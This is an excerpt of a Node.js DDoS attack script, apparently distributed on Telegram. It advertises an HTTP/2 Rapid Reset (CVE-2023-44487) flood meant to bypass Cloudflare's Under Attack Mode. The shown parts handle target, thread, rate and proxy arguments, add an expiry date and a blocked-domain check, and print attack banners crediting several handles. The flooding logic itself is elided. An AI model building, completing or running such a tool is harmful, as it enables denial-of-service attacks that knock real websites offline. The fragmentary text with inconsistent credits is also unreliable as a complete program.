...
const targetDate = new Date('2030-07-21');
...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.error(`
    CF-UAM v1 Method With RST STREAM (CVE-2023-44487) // Updated: 01.05.2024 // With love @resetcve
    Developers to method: @dewaaa666 - developer method // @shiftwise - recoding method
    How to use & example:
...
if (currentDate > targetDate) {
    console.error('Error method has been outdate pm @dewaaa666');
    process.exit(1);
}

if (url.hostname.endsWith(blockedDomain)) {
    console.log(`Domain ${blockedDomain} blocked, if this mistake pm to tg @dewaaa666`);
    process.exit(1);
}
...
if (cluster.isMaster) {
    ...
    console.log(`
             ...
             ╚╦════════════════════════════════════════╦╝
           ╔══╩════════════════════════════════════════╩═══╗
             Methods DDoS By Kocell || Last Update 7 August
           ╚══╦═════════════════════════════════════════╦══╝
                            Dev : t.me/dewaaa666
              ╚═════════════════════════════════════════╝

`)
console.log(`[@Tornado] Target: `+ process.argv[3])
console.log(`[@Tornado] Time: `+ process.argv[4])
console.log(`[@Tornado] Rate: `+ process.argv[5])
console.log(`[@Tornado] Thread: ` + process.argv[6])
console.log(`[@Tornado] Mode:` + process.argv[2])
console.log(`[@Tornado] Methods: Tornado`)
console.log(`[@Tornado] Methods DDoS By ThurX`)
